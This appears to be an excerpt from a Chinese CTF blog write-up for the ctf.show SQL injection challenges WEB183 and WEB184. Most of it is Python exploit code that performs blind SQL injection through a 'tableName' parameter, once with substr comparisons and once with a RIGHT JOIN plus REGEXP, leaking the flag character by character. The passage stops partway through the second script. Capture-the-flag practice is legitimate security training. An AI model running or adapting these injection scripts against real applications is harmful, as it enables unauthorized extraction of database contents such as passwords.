              <h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="WEB183"><a href="#WEB183" class="headerlink" title="WEB183"></a>WEB183</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url=<span class="hljs-string">&#x27;http://3fa6cf1b-68bf-4910-b9dc-28b97cb4d773.challenge.ctf.show:8080/select-waf.php&#x27;</span><br>flag=<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>ch=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ch:<br>        data=&#123;<br>            <span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&quot;(ctfshow_user)where(substr(pass,&#123;&#125;,1)&lt;&gt;&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),j)<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        r=requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;$user_count = 21&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.2</span>)<br></code></pre></td></tr></table></figure>

<h4 id="WEB184"><a href="#WEB184" class="headerlink" title="WEB184"></a>WEB184</h4><p>学了一招 右连接注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url=<span class="hljs-string">&#x27;http://2d523959-8532-41a5-be0a-f519a198a1d7.challenge.ctf.show:8080/select-waf.php&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>ch=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;&#x27;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ch:<br>        data=&#123;<br>            <span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&quot;ctfshow_user as a RIGHT JOIN ctfshow_user as b on (substr(b.pass,&#123;&#125;,1) REGEXP char(&#123;&#125;))&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(j)))<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        r=requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> <span clas
